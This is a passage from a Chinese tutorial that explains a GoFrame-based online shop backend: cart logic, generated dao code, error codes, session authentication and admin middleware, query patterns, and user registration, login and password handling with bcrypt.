		return 0, 0, gerror.Newf("库存不足，最多可购买 %d 件", goods.Stock)
	}
```

这是核心逻辑：**购物车里已有这件商品 → 数量累加；累加后的总数不能超过库存**。

注意 `quantity` 是"累加后"的数量再和库存比——不是说一次加 100 件才算超，而是你之前加了 90 件、这次又加 20 件，总共 110 件超过库存 100 件，也要拒绝。

```go
	if exist != nil {
		if _, err = dao.Cart.Ctx(ctx).
			Where(cols.Id, exist.Id).
			Data(g.Map{cols.Quantity: quantity}).
			Update(); err != nil {
			return 0, 0, err
		}
		return exist.Id, quantity, nil
	}
```

已有记录 → 改数量（UPDATE）。`Data(g.Map{...})` 是"要改哪些列"的写法，这里只改 `quantity` 一列。

```go
	id, err := dao.Cart.Ctx(ctx).Data(g.Map{
		cols.UserId:   in.UserID,
		cols.GoodsId:  in.GoodsID,
		cols.Quantity: quantity,
	}).InsertAndGetId()
	if err != nil {
		// 唯一键 uk_user_goods 冲突说明并发下刚插入同商品记录，退化为累加更新
		if row, e := s.getByGoods(ctx, in.UserID, in.GoodsID); e == nil && row != nil {
			merged := row.Quantity + in.Quantity
			if merged > goods.Stock {
				return 0, 0, gerror.Newf("库存不足，最多可购买 %d 件", goods.Stock)
			}
			...
		}
		return 0, 0, err
	}
	return uint64(id), quantity, nil
```

没有记录 → 插入（INSERT）。

**这段 `if err != nil` 里的补救逻辑值得单独说**：

设想用户在手机上快速点了两下"加入购物车"，两个请求几乎同时到达服务器：

```
请求 A：查购物车 → 没有这条 → 准备插入
请求 B：查购物车 → 没有这条 → 准备插入   ← A 还没插完
请求 A：插入成功
请求 B：插入 → 撞唯一键 uk_user_goods → 报错
```

如果没有补救，B 会返回一个数据库错误给用户，用户看到"Duplicate entry"这种看不懂的话。

补救逻辑是：插入失败时再查一次，如果发现记录已经存在了（说明是 A 插的），就改成 UPDATE 累加。用户无感知。

这是**乐观策略**：先假设不会冲突，冲突了再补救。比"先加锁"性能好，代码也简单。

### 2.3.5 dao 与 entity：别自己拼表名和字段名

```go
// internal/dao/internal/cart.go（生成代码，节选）
type CartColumns struct {
	Id        string // 购物车项ID
	UserId    string // 用户ID
	GoodsId   string // 商品ID
	Quantity  string // 数量
	CreatedAt string //
	UpdatedAt string //
}

var cartColumns = CartColumns{
	Id:        "id",
	UserId:    "user_id",
	GoodsId:   "goods_id",
	Quantity:  "quantity",
	CreatedAt: "created_at",
	UpdatedAt: "updated_at",
}
```

这看起来是废话——字符串 `"user_id"` 不就是 `user_id` 吗？为什么绕一圈？

因为两个原因：

**1. 拼错了编译器能发现**

```go
// 用常量
dao.Cart.Ctx(ctx).Where(dao.Cart.Columns().UserId, 2)      // ✓ 编译通过
dao.Cart.Ctx(ctx).Where(dao.Cart.Columns().UserID, 2)      // ✗ 编译报错，没有这个字段

// 用字符串
dao.Cart.Ctx(ctx).Where("userID", 2)                        // 编译通过，运行时 SQL 报错
```

注意 Go 是大小写敏感的：`UserId` 和 `UserID` 是两个不同的名字。用生成的常量，写错立刻被编译器拦下；用裸字符串，要等到运行时才炸。

**2. 换表名/改字段只需重新生成**

哪天想把 `user_id` 改成 `uid`，改完数据库跑一次 `gf gen dao`，所有代码自动跟着变。如果全项目都是裸字符串，就得全局搜索替换，还可能误伤。

`entity` 则是"一行数据在 Go 里的样子"：

```go
// internal/model/entity/goods.go（生成代码）
var goods *entity.Goods
dao.Goods.Ctx(ctx).WherePri(id).Scan(&goods)
// 之后用 goods.Name、goods.Price 访问，像访问普通结构体一样
```

`Scan(&goods)` 是"把查询结果填进这个变量"。

### 2.3.6 model：层与层之间的"内部信封"

`internal/model/` 下的结构体既不是数据库表的映射，也不是对外的接口格式，而是**内部传参用的**：

```go
// internal/model/cart.go
type CartAddInput struct {
	UserID   uint64
	GoodsID  uint64
	Quantity uint
}
```

为什么不用 `api` 层的 `v1.AddReq` 直接传？因为它少了 `UserID`——那是从登录态取的，不在请求参数里。

再看一个组合的例子：

```go
// internal/model/order.go
type OrderDetailItem struct {
	entity.OrderItem        // 内嵌：商品快照的所有字段
	Reviewed bool           // 额外加一个：是否已评价
}
```

这是 Go 的**内嵌（embedding）**：`entity.OrderItem` 的字段被"提升"到外层，所以 `item.GoodsName` 能直接访问，同时又能多带一个 `Reviewed`。比写 8 个重复字段清爽。

## 2.4 三个生成器：什么时候必须重跑

项目里有三个 `gf gen` 命令，产物不同，**用错会出大事**：

| 命令 | 产物 | 什么时候要跑 |
|---|---|---|
| `gf gen dao` | `internal/dao/*`、`internal/model/entity/*`、`internal/model/do/*` | **改了表结构**（加列、删列、改类型、加表） |
| `gf gen service` | `internal/service/*.go` 接口声明 | **改了 logic 层的方法签名**（加参数、改返回类型） |
| `gf gen ctrl` | `api/<模块>/<模块>.go` 接口定义、`internal/controller/<模块>/xxx_v1_xxx.go` 骨架 | **在 api 层加了新的 Req/Res** |

### 三个必须知道的坑

**坑 1：`api/xxx/xxx.go` 不能手写**

```go
// api/user/user.go
// =================================================================================
// Code generated and maintained by GoFrame CLI tool. DO NOT EDIT.
// =================================================================================

package user

type IUserV1 interface {
	Register(ctx context.Context, req *v1.RegisterReq) (res *v1.RegisterRes, err error)
	...
}
```

如果你手动在这个目录建一个 `myapi.go` 也定义一个 `Register`，`gf gen ctrl` 会认为"这个接口已经有人实现了"，然后把你的文件改名成 `.if.go` 退让，结果两个文件重复定义，编译失败。

**规矩：`api/` 下的文件全部由 `gf gen ctrl` 生成，一个新接口只需要在 `api/xxx/v1/xxx.go` 里加一对 Req/Res，然后跑生成器。**

**坑 2：`internal/service/*.go` 手写之后生成器就不管了**

`gf gen service` 的逻辑是：如果发现某个文件不像是它生成的（有手写痕迹），就跳过，日志里说 "manually maintained"。

这会导致：你改了 logic 里的方法签名，但 `service` 里的接口声明没更新，编译报错"方法签名不匹配"。

**解决办法：先删掉 `internal/service/*.go`，再跑 `gf gen service`。** 它会重新生成全部接口。

**坑 3：中间件不能放在 `internal/logic/` 下**

`gf gen service` 会扫描 `internal/logic/` 下的所有包，给每个包生成一个"服务接口"。如果中间件放在 `internal/logic/middleware/`，它会被当成一个业务模块，生成一个空的 `service/middleware.go`，然后你的中间件代码和生成的空文件冲突。

所以中间件放在 `internal/middleware/`，在 `logic/` 之外。

### 怎么确认没搞坏

这三个生成器有个很好的特性：**它们是幂等的**。意思是，如果代码已经是最新状态，再跑一遍不会产生任何改动。

所以项目里有个固定的验证步骤：

```bash
git add -A                 # 先暂存当前改动
gf gen dao                 # 跑三个生成器
gf gen service
gf gen ctrl
git status --short         # 应该没有任何输出
```

如果 `git status` 是空的，说明生成的代码和仓库里的一致——规范守住了。如果有 diff，说明某处手写代码和生成规则打架了，得先解决。

## 2.5 错误怎么传：gcode + gerror

Go 没有异常机制，错误是**返回值**。这个项目用 GoFrame 的错误码体系：

```go
// internal/consts/code.go
var (
	// CodeNotAdmin 非管理员访问后台接口
	CodeNotAdmin = gcode.New(40301, "需要管理员权限", nil)

	// CodeGoodsOffSale 商品已下架，不可操作
	CodeGoodsOffSale = gcode.New(50001, "商品已下架", nil)
)
```

`gcode.New(码, 默认提示, 附加数据)`。

调用处：

```go
// 用自定义错误码
return 0, gerror.NewCode(consts.CodeNotAdmin)

// 用框架内置错误码
return 0, gerror.NewCode(gcode.CodeNotAuthorized, "请先登录")
return 0, gerror.NewCode(gcode.CodeNotFound, "订单不存在")
return 0, gerror.NewCode(gcode.CodeValidationFailed, "原密码不正确")

// 带动态内容
return 0, gerror.Newf("库存不足，最多可购买 %d 件", goods.Stock)
```

**为什么要费劲用错误码，不直接 `errors.New("订单不存在")`？**

因为前端需要**区分错误类型做不同处理**。比如：

```js
// resource/public/index.html 第 1062 行
catch (e) {
  if (e.code === 61) {          // 61 = 未登录
    pendingAdd = { goodsId, qty };
    openLogin('login');         // 弹登录框，而不是报错
    return;
  }
  toast(e.message);             // 其它错误就提示一句话
}
```

如果错误只有一句中文，前端只能靠字符串匹配判断"是不是没登录"，改一个字就崩。有了数字码，判断稳定可靠。

**项目里的码段约定**：

| 码段 | 含义 | 例子 |
|---|---|---|
| 0 | 成功 | |
| 50 | 参数校验失败 | 51 = `CodeValidationFailed` |
| 61 | 未登录 | `CodeNotAuthorized` |
| 65 | 数据不存在 | `CodeNotFound` |
| 40301 | 不是管理员 | 项目自定义 |
| 50001 | 业务校验失败 | 项目自定义 |

避开了框架内置码（0~1000）的区间，不会撞车。

**错误怎么变成 JSON？**

业务层 `return nil, err` 一路往上传到控制器，控制器也 `return nil, err`，最后 `MiddlewareHandlerResponse` 这个中间件统一捕获，转成：

```json
{"code":51,"message":"原密码不正确","data":null}
```

所以你的业务代码不需要关心"怎么返回 HTTP 状态码"，只需要关心"用什么错误码"。

## 2.6 中间件：进门先查证件

中间件是"在请求到达你的代码之前，先执行的函数"。可以有多层，像安检。

### Auth：查登录态

```go
// internal/middleware/middleware.go
func Auth(r *ghttp.Request) {
	// 第 1 步：从 Session 里取 userId
	sessionVar, err := r.Session.Get(SessionUserID)
	if err != nil {
		r.SetError(gerror.NewCode(gcode.CodeInternalError, "会话读取失败"))
		return
	}

	userID := sessionVar.Uint64()
	if userID == 0 {
		r.SetError(gerror.NewCode(gcode.CodeNotAuthorized, "请先登录"))
		return
	}
```

**Session 是什么？** 用户登录成功后，服务器在内存里存一份 `userId=2`，给浏览器发一个随机串（比如 `abc123`）放在 Cookie 里。之后浏览器每次请求都带着 `abc123`，服务器凭它找到 `userId=2`。

为什么这么设计？因为 Cookie 是存在用户电脑上的，可以被查看和修改。如果直接把 `userId=2` 放在 Cookie 里，用户改成 `userId=1` 就成了管理员。放一个随机串，用户改了也没用——服务器找不到对应的 Session。

```go
	// 第 2 步：回查数据库，确认账号还存在且没被禁用
	user, err := service.User().GetById(r.Context(), userID)
	if err != nil || user == nil {
		// 账号已被删除：清掉脏 Session
		_ = r.Session.Remove(SessionUserID)
		r.SetError(gerror.NewCode(gcode.CodeNotAuthorized, "请先登录"))
		return
	}
	if user.Status != consts.UserStatusNormal {
		_ = r.Session.Remove(SessionUserID)
		r.SetError(gerror.NewCode(gcode.CodeNotAuthorized, "账号已被禁用"))
		return
	}
```

**这一步是项目特意加的，很多教程里没有。**

常规做法是：登录时把 `userId` 和 `role` 都写进 Session，之后每次请求只读 Session，不查库。问题是——管理员禁用了某个账号，或者把一个管理员降级成普通用户，**对方只要不退出登录，权限就一直有效**，直到 Session 过期。

这里的做法是每次请求回查一次 `user` 表。代价是多一次数据库查询（走主键，很快），换来的是**禁用和降权即时生效**。

```go
	// 第 3 步：把用户信息放进请求上下文，供后面的代码使用
	r.SetCtxVar(CtxUserID, userID)
	r.SetCtxVar(CtxUserRole, user.Role)
	r.Middleware.Next()   // 放行，继续执行后面的处理
```

`SetCtxVar` 是往"请求上下文"里塞值。上下文（context）是一条请求的随身包裹，从头跟到尾，谁都能往里放东西、取东西。

控制器里这样取：

```go
// internal/controller/cart/cart_new.go
func currentUserID(ctx context.Context) uint64 {
	return g.RequestFromCtx(ctx).GetCtxVar(middleware.CtxUserID).Uint64()
}
```

**角色也放进上下文了**，这样 `Admin` 中间件不用再查一次库（省一次 SQL）。

### Admin：查是不是管理员

```go
// internal/middleware/admin.go
func Admin(r *ghttp.Request) {
	userID := r.GetCtxVar(CtxUserID).Uint64()
	if userID == 0 {
		r.SetError(gerror.NewCode(gcode.CodeNotAuthorized, "请先登录"))
		return
	}
	if r.GetCtxVar(CtxUserRole).Uint() != consts.UserRoleAdmin {
		r.SetError(gerror.NewCode(consts.CodeNotAdmin))
		return
	}
	r.Middleware.Next()
}
```

只有 4 行判断。**前提是它必须挂在 `Auth` 之后**——`Auth` 负责把 `CtxUserRole` 放进去，`Admin` 才有得读。挂反了的话 `CtxUserID` 永远是 0，所有人都进不去。

### 中间件怎么挂上去

```go
// internal/cmd/cmd.go
var Main = gcmd.Command{
	Func: func(ctx context.Context, parser *gcmd.Parser) (err error) {
		s := g.Server()

		// 第 1 组：公开接口，不需要登录
		s.Group("/", func(group *ghttp.RouterGroup) {
			group.Middleware(ghttp.MiddlewareHandlerResponse)
			group.Bind(
				hello.NewV1(),
				user.NewV1(),      // 登录、注册、改资料都在这里
				goods.NewV1(),
				category.NewV1(),
			)
		})

		// 第 2 组：需要登录
		s.Group("/", func(group *ghttp.RouterGroup) {
			group.Middleware(ghttp.MiddlewareHandlerResponse, middleware.Auth)
			group.Bind(
				cart.NewV1(),
				order.NewV1(),
			)
		})

		// 第 3 组：后台，需要登录 + 管理员
		s.Group("/admin", func(group *ghttp.RouterGroup) {
			group.Middleware(ghttp.MiddlewareHandlerResponse, middleware.Auth, middleware.Admin)
			group.Bind(
				admin.NewV1(),
			)
		})

		s.Run()
		return nil
	},
}
```

三个组，三道门禁，层次很清楚：

| 分组 | 中间件 | 包含的模块 |
|---|---|---|
| `/` | 无鉴权 | `user`（登录注册必须能匿名访问）、`goods`、`category`（游客能浏览） |
| `/` | `Auth` | `cart`、`order`（必须知道是谁） |
| `/admin` | `Auth` + `Admin` | `admin`（必须登录且是管理员） |

**注意第三个组的路径前缀是 `/admin`**，所以 `admin` 模块里写的 `path:"/user/list"` 实际访问路径是 `/admin/user/list`。这样后台接口和前台接口在 URL 上就分开了，不会混淆。

**一个容易踩的坑：`user` 模块整体在公开分组里，但它里面有需要登录的接口**（`/user/profile`、`/user/password`、`/user/info`）。所以这些接口只能自己在代码里检查登录态：

```go
// internal/controller/user/user_helper.go
func currentUserID(ctx context.Context) (uint64, error) {
	sessionVar, err := g.RequestFromCtx(ctx).Session.Get(middleware.SessionUserID)
	if err != nil {
		return 0, err
	}
	userId := sessionVar.Uint64()
	if userId == 0 {
		return 0, gerror.NewCode(gcode.CodeNotAuthorized, "请先登录")
	}
	return userId, nil
}
```

这就是为什么项目里有两个同名但签名不同的 `currentUserID`：

| 位置 | 来源 | 返回值 |
|---|---|---|
| `controller/order`、`cart`、`admin` | 上下文变量（Auth 中间件放的） | `uint64` |
| `controller/user` | Session（自己读的） | `(uint64, error)` |

功能一样，来源不同，因为所处的位置不同。

## 2.7 查数据的几种套路

### 套路 1：单条查询

```go
// internal/logic/user/user.go 第 87 行
func (s *sUser) GetById(ctx context.Context, id uint64) (*entity.User, error) {
	var user *entity.User
	if err := dao.User.Ctx(ctx).WherePri(id).Scan(&user); err != nil {
		return nil, err
	}
	if user == nil {
		return nil, gerror.NewCode(gcode.CodeNotFound, "用户不存在")
	}
	return user, nil
}
```

注意 `var user *entity.User` 是**指针**，查询不到时它是 `nil`。这就是为什么后面要判断 `if user == nil`。

如果写成 `var user entity.User`（非指针），查不到时它是一个全零的结构体，你没法区分"查到了一个 id=0 的用户"和"没查到"。

### 套路 2：分页 + 总数

```go
// internal/logic/goods/goods.go 第 40 行
var (
	list  []entity.Goods
	total int
)
if err := m.Page(in.Page, in.PageSize).
	OrderDesc(dao.Goods.Columns().Sales).
	OrderDesc(dao.Goods.Columns().Id).
	ScanAndCount(&list, &total, false); err != nil {
	return nil, 0, err
}
```

`ScanAndCount` 一次做两件事：查当前页的数据，同时查总条数。第二个参数 `false` 表示"总数不复用查询条件里的 limit"（否则总条数会变成"当前页的条数"）。

如果分两次写 `Scan` + `Count`，就是两条 SQL；`ScanAndCount` 内部也是两条，但只写一次条件，不容易漏。

### 套路 3：避免 N+1

这是数据库性能里最著名的坑。

**错误写法**：查 10 笔订单，每笔订单再查一次明细。

```go
for _, order := range orders {
    // 循环里查数据库 —— 10 笔订单 = 11 次 SQL（1 次查订单 + 10 次查明细）
    dao.OrderItem.Ctx(ctx).Where("order_id", order.Id).Scan(&items)
}
```

10 笔还好，100 笔就是 101 次往返，每次都要网络延迟，页面会明显变慢。

**正确写法**：先用 `WHERE IN` 一次查完所有明细，再在内存里分组。

```go
// internal/logic/order/order.go 第 366 行
func aggregateItems(ctx context.Context, orderIDs []uint64) (map[uint64]*itemAgg, error) {
	agg := make(map[uint64]*itemAgg, len(orderIDs))
	if len(orderIDs) == 0 {
		return agg, nil
	}

	cols := dao.OrderItem.Columns()
	var items []entity.OrderItem
	if err := dao.OrderItem.Ctx(ctx).
		WhereIn(cols.OrderId, orderIDs).    // ← 一次查完所有订单的明细
		OrderAsc(cols.Id).
		Scan(&items); err != nil {
		return nil, err
	}

	for _, it := range items {              // ← 在内存里按 order_id 分组
		a, ok := agg[it.OrderId]
		if !ok {
			a = &itemAgg{}
			agg[it.OrderId] = a
		}
		if a.ItemCount == 0 {
			a.FirstName = it.GoodsName      // 记住第一个商品，列表页要显示
			a.FirstCover = it.GoodsCover
		}
		a.ItemCount++
		a.Quantity += it.Quantity
	}
	return agg, nil
}
```

2 次 SQL 解决，跟订单数量无关。

同样的模式在项目里出现了三次：

| 函数 | 解决什么 N+1 |
|---|---|
| `aggregateItems` | 订单列表 → 每笔订单的明细汇总 |
| `orderStatsByUser` | 用户列表 → 每个用户的订单数与消费额 |
| `goodsCountByCategory` | 分类列表 → 每个分类的商品数 |

`orderStatsByUser` 还用了个 SQL 技巧：

```go
// internal/logic/user/user.go 第 180 行
amountExpr := fmt.Sprintf(
	"SUM(CASE WHEN %s IN (%s) THEN %s ELSE 0 END) AS amount",
	cols.Status, paid, cols.TotalAmount,
)
```

`CASE WHEN ... THEN ... ELSE 0 END` 是 SQL 里的 if。这段的意思是"只有当状态是已付款/已发货/已完成时，才累加金额，否则加 0"。

为什么要这样？因为"订单数"和"消费额"的统计口径不同：

- 订单数：全部状态都算（下了 3 单取消 2 单，也是下过 3 单）
- 消费额：只算已付款及之后（取消的单没付钱，不算收入）

如果用同一个查询条件，这两个数就只能选一个口径。用 `CASE WHEN` 可以在一次查询里算两个口径。

# 第 3 章 六个业务模块逐个拆

这一章按模块讲业务规则。你会发现每节的代码结构都一样：查数据 → 判断 → 写数据 → 返回。真正变化的是**判断什么**。

## 3.1 用户：注册、登录、改资料、改密码

### 3.1.1 注册

```go
// internal/logic/user/user.go 第 30 行
func (s *sUser) Register(ctx context.Context, username, password, nickname string) (uint64, error) {
	// ① 查用户名是否已存在
	count, err := dao.User.Ctx(ctx).Where(dao.User.Columns().Username, username).Count()
	if err != nil {
		return 0, err
	}
	if count > 0 {
		return 0, gerror.NewCode(gcode.CodeValidationFailed, "用户名已被占用")
	}

	// ② 密码哈希
	hashed, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
	if err != nil {
		return 0, err
	}

	// ③ 昵称为空则用用户名兜底
	if nickname == "" {
		nickname = username
	}

	// ④ 插入
	result, err := dao.User.Ctx(ctx).Data(do.User{
		Username: username,
		Password: string(hashed),
		Nickname: nickname,
		Status:   1,
	}).Insert()
	if err != nil {
		return 0, err
	}

	// ⑤ 取回自增主键
	id, err := result.LastInsertId()
	if err != nil {
		return 0, err
	}
	return uint64(id), nil
}
```

四个细节：

**`bcrypt.GenerateFromPassword` 返回的是 `[]byte`，要转成 `string` 才能存。** 存进数据库的是一串大约 60 个字符的乱码。

**`bcrypt.DefaultCost` 是计算强度（默认 10）。** 数字越大越慢越安全。10 大约是 50~100 毫秒一次——这意味着暴力破解变慢了，但也意味着你自己登录时每次都多花 50 毫秒。这是刻意的取舍。

**`do.User` 和 `g.Map` 的区别**：

```go
dao.User.Ctx(ctx).Data(do.User{Username: "x", Password: "y"})   // 结构体写法
dao.User.Ctx(ctx).Data(g.Map{"username": "x", "password": "y"}) // map 写法
```

`do.User` 是生成代码，字段名有补全、拼错编译报错；但它的零值字段会被**忽略**（不会把 `nickname: ""` 写进去）。`g.Map` 更灵活但有拼错风险。

项目的选择是：**插入用 `do.Xxx`（字段固定），更新用 `g.Map`（只改想改的列）**。

**第 ① 步的查重不是绝对可靠的。** 两个请求同时注册同一个用户名，都通过了 `Count() == 0` 的检查，然后都去插入。这时候数据库的 `uk_username` 唯一键会挡住第二个，返回错误。

代码没有捕获这个错误，所以并发注册同名用户时，第二个会收到一个数据库层面的报错（不是友好的"用户名已被占用"）。这是个小瑕疵，实际影响不大——但知道这个隐患有好处。

### 3.1.2 登录

```go
// internal/logic/user/user.go 第 66 行
func (s *sUser) Login(ctx context.Context, username, password string) (*entity.User, error) {
	var user *entity.User
	if err := dao.User.Ctx(ctx).Where(dao.User.Columns().Username, username).Scan(&user); err != nil {
		return nil, err
	}
	if user == nil {
		return nil, gerror.NewCode(gcode.CodeNotAuthorized, "用户名或密码错误")   // ← 注意提示
	}

	if err := bcrypt.CompareHashAndPassword([]byte(user.Password), []byte(password)); err != nil {
		return nil, gerror.NewCode(gcode.CodeNotAuthorized, "用户名或密码错误")   // ← 同一个提示
	}

	if user.Status != 1 {
		return nil, gerror.NewCode(gcode.CodeNotAuthorized, "账号已被禁用")
	}

	return user, nil
}
```

**"用户名或密码错误"这一句是刻意重复的。**

如果用户名不存在时说"用户不存在"，密码错时说"密码错误"，攻击者就能试出"哪些用户名是真实存在的"——这叫**用户枚举**。知道了用户名，就能针对性地猜密码。

统一成一句话，攻击者无法区分。

但"账号已被禁用"这句单独说了。这是矛盾的取舍：它确实泄露了"这个账号存在"，但用户需要知道自己为什么登不上，否则会以为密码错了反复尝试。这里选择优先用户体验。

**登录成功后写 Session** 是在控制器里做的，不在 logic 里：

**为什么 Session 的键写成了字符串 `"userId"` 而不是常量？**

`middleware.SessionUserID` 这个常量定义的就是 `"userId"`：

```go

```

这里硬编码了字符串，而读取的地方用的是常量。目前值相同所以能跑通，但这是个隐患：哪天把常量改成 `"user_id"`，登录仍然写 `"userId"`，结果是"登录成功但一直显示未登录"，而且很难查。

（这是个已知的小瑕疵，改成 `middleware.SessionUserID` 就行。）

### 3.1.3 用户自助改资料

```go
// internal/logic/user/user.go 第 202 行
func (s *sUser) UpdateProfile(ctx context.Context, in model.UserProfileInput) (*entity.User, error) {
	cols := dao.User.Columns()

	var user *entity.User

		return nil, err

	if user.Status != consts.UserStatusNormal {
		return nil, gerror.NewCode(gcode.CodeNotAuthorized, "账号已被禁用")
	}
```

**第一道：账号必须存在且未被禁用。** 再次强调，因为 `/user/profile` 在公开分组里，没有 Auth 中间件保护。

```go
	email, phone := strings.TrimSpace(in.Email), strings.TrimSpace(in.Phone)
	// 排除自己：原样提交未改动的邮箱/手机号不算重复
	if err := checkContactUnique(ctx, email, phone, user.Id); err != nil {
		return nil, err
	}
```

**第二道：邮箱/手机号不能和别人重复。**

`TrimSpace` 是去掉首尾空格——用户复制粘贴时经常带上空格，`" alice@example.com "` 和 `"alice@example.com"` 应该被视为同一个。

`checkContactUnique` 的第三个参数 `excludeID` 是关键：

```go
// internal/logic/user/user.go 第 397 行

	cols := dao.User.Columns()

	if email != "" {
		m := dao.User.Ctx(ctx).Where(cols.Email, email)
		if excludeID > 0 {
			m = m.WhereNot(cols.Id, excludeID)   // ← 排除自己
		}
		n, err := m.Count()
		...
	}
	...
}
```

没有 `excludeID` 会怎样？用户打开资料页，什么都没改，直接点保存——系统去查"这个邮箱有没有别人用"，查到了自己，然后报"该邮箱已被其他账号使用"。用户会莫名其妙。

**第三道：昵称为空则回退到用户名。**

```go
	nickname := strings.TrimSpace(in.Nickname)
	if nickname == "" {
		nickname = user.Username
	}
```

因为 `nickname` 列是 `NOT NULL`，不能存空。但业务上"不填昵称"是合法的，所以用一个默认值兜住。

**第四步：更新，并注意 nullable 的处理。**

```go
	if _, err := dao.User.Ctx(ctx).WherePri(user.Id).Data(g.Map{
		cols.Nickname: nickname,
		cols.Email:    nullableContact(email),    // ← 空则 NULL
		cols.Phone:    nullableContact(phone),    // ← 空则 NULL
	}).Update(); err != nil {
		return nil, err
	}

	// 回填返回值，前端拿到就能刷新顶栏昵称，省一次 /user/info
	user.Nickname = nickname
	user.Email = email
	user.Phone = phone
	return user, nil
```

最后三行是**主动回填内存里的结构体**。因为 `Update()` 之后，`user` 这个变量里还是旧数据。如果直接把 `user` 返回给前端，前端会显示修改前的昵称——用户会以为没保存成功。

**这里有一个容易忽略的点**：`g.Map` 里同时写了 `email` 和 `phone`，意味着**这是整体覆盖，不是增量更新**。

如果前端只传了 `nickname`，没传 `email`，那么 `in.Email` 是空字符串，`nullableContact("")` 返回 `nil`，结果是**邮箱被清空了**。

这正是项目里踩过的一个 bug：后台用户列表的"快捷禁用"按钮只传了 `status`，结果把用户的邮箱手机号都清空了。修复办法是让前端把 `email`/`phone` 一起回传。

**教训：用 `g.Map` 做全量覆盖时，前端必须把所有可编辑字段都传上来。**

### 3.1.4 用户自助改密码

```go
// internal/logic/user/user.go 第 247 行
func (s *sUser) ChangePassword(ctx context.Context, in model.UserPasswordInput) error {
	...
	// 校验 1：账号正常
	if user.Status != consts.UserStatusNormal {
		return gerror.NewCode(gcode.CodeNotAuthorized, "账号已被禁用")
	}

	// 校验 2：原密码对不对
	if err := bcrypt.CompareHashAndPassword([]byte(user.Password), []byte(in.OldPassword)); err != nil {
		return gerror.NewCode(gcode.CodeValidationFailed, "原密码不正确")
	}

	// 校验 3：新旧不能相同
	if bcrypt.CompareHashAndPassword([]byte(user.Password), []byte(in.NewPassword)) == nil {
		return gerror.NewCode(gcode.CodeValidationFailed, "新密码不能与原密码相同")
	}

	// 重新哈希后入库
	hashed, err := bcrypt.GenerateFromPassword([]byte(in.NewPassword), bcrypt.DefaultCost)
	if err != nil {
		return err
	}
	_, err = dao.User.Ctx(ctx).WherePri(user.Id).Data(g.Map{cols.Password: string(hashed)}).Update()
	return err
}
```

**为什么必须验原密码？**

因为 Session 只能证明"这个浏览器登录过"，不能证明"操作的人是本人"。

场景：你在公司电脑上登录了商城，去开会没锁屏。同事走过来，打开你的电脑，点"修改密码"，直接改成他知道的密码。之后你的账号就是他的了——他甚至不需要知道你的原密码。

**为什么"新旧相同"要拦？**

从安全角度没区别，但从体验角度：用户以为改成功了，下次登录还是老密码，会困惑。直接告诉他"不能相同"更清楚。

**验证新密码和原密码是否相同，为什么用 `CompareHashAndPassword` 而不是直接字符串比较？**

因为数据库里存的是哈希，没有原文。只能用"新密码 + 旧哈希"去验证——如果验证通过，说明新密码和原密码一样。

### 3.1.5 后台用户管理：两个"防呆"设计

后台编辑用户时，有两条容易被忽略但很重要的规则。

```go
// internal/logic/user/user.go 第 281 行
func (s *sUser) AdminSave(ctx context.Context, in model.UserSaveInput, operatorID uint64) (uint64, error) {
	...
	// 规则 1：不能把自己降级或禁用
	if target.Id == operatorID && (in.Role != consts.UserRoleAdmin || in.Status != consts.UserStatusNormal) {
		return 0, gerror.NewCode(gcode.CodeInvalidParameter, "不能降级或禁用当前登录的账号")
	}
```

**规则 1：不能对自己动手。**

管理员把自己从"管理员"改成"普通用户"，点保存——操作成功了（数据库确实改了），但下一秒这个请求返回后，`Auth` 中间件回查发现角色变了，这个人立刻失去后台权限，**再也进不去了**。

如果他是唯一的管理员，整个后台就锁死了，只能去数据库里手动改回来。

```go
	// 规则 2：至少保留一名可用管理员
	demoting := target.Role == consts.UserRoleAdmin &&
		(in.Role != consts.UserRoleAdmin || in.Status != consts.UserStatusNormal)
	if demoting {
		n, err := dao.User.Ctx(ctx).
			Where(cols.Role, consts.UserRoleAdmin).
			Where(cols.Status, consts.UserStatusNormal).
			WhereNot(cols.Id, target.Id).    // ← 不数自己
			Count()
		if err != nil {
			return 0, err
		}
		if n == 0 {
			return 0, gerror.NewCode(gcode.CodeInvalidParameter, "系统至少需要保留一名可用管理员")
		}
	}
```

**规则 2：不能把最后一个管理员干掉。**

管理员 A 去降级管理员 B。如果 B 是最后一个，降完之后系统里就没有管理员了。

注意 `WhereNot(cols.Id, target.Id)` ——统计"除了目标之外还有几个可用管理员"。因为如果目标本身不是管理员，这条规则不适用（`demoting` 那个条件已经挡掉了）。

`demoting` 的判断写得很紧凑：

```go
demoting := target.Role == consts.UserRoleAdmin &&          // 目标现在是管理员
            (in.Role != consts.UserRoleAdmin ||             // 且要被降级
             in.Status != consts.UserStatusNormal)          // 或要被禁用
```

这段代码得仔细读：如果目标是管理员，且新角色不是管理员**或者**新状态不是正常，就认为"这次操作会让一个管理员消失"。

## 3.2 分类：树形结构怎么排

数据库里存的是平铺的列表：

| id | parent_id | name | sort |
|---|---|---|---|
| 1 | 0 | 数码 | 0 |
| 2 | 1 | 充电器 | 0 |
| 3 | 1 | 耳机 | 0 |
| 4 | 0 | 生活 | 0 |

但前台要显示成：

```
数码
  充电器
  耳机
生活
```

### 3.2.1 排序算法

```go
// internal/logic/category/category.go 第 43 行
func sortAsTree(list []entity.Category) []entity.Category {
	// ① 按 parent_id 分组
	children := make(map[uint][]entity.Category, len(list))
	for _, item := range list {
		children[item.ParentId] = append(children[item.ParentId], item)
	}
```

第一步，建一个"父 ID → 子列表"的映射。跑完之后 `children` 长这样：

```go
children[0] = [数码, 生活]        // 顶级分类
children[1] = [充电器, 耳机]      // 数码的子分类
children[2] = []                  // 充电器没有子分类
```

```go
	// ② 从顶级开始，深度优先遍历
	ordered := make([]entity.Category, 0, len(list))
	var walk func(parentID uint)
	walk = func(parentID uint) {
		for _, item := range children[parentID] {
			ordered = append(ordered, item)   // 先输出自己
			walk(item.Id)                     // 再输出自己的孩子（递归）
		}
	}
	walk(0)
```

第二段是**递归函数**。`walk(0)` 的意思是"把 parent_id=0 的所有分类依次处理"：

```
walk(0):
  取到 children[0] = [数码, 生活]
    处理 数码 → 追加到 ordered
      walk(数码.id = 1):
        取到 children[1] = [充电器, 耳机]
          处理 充电器 → 追加
            walk(充电器.id = 2): children[2] 是空的，什么都不做，返回
          处理 耳机 → 追加
            walk(耳机.id = 3): 空的，返回
        结束，返回
    处理 生活 → 追加
      walk(生活.id = 4): 空的，返回
```

最终 `ordered` = `[数码, 充电器, 耳机, 生活]`，正好是要的树形顺序。

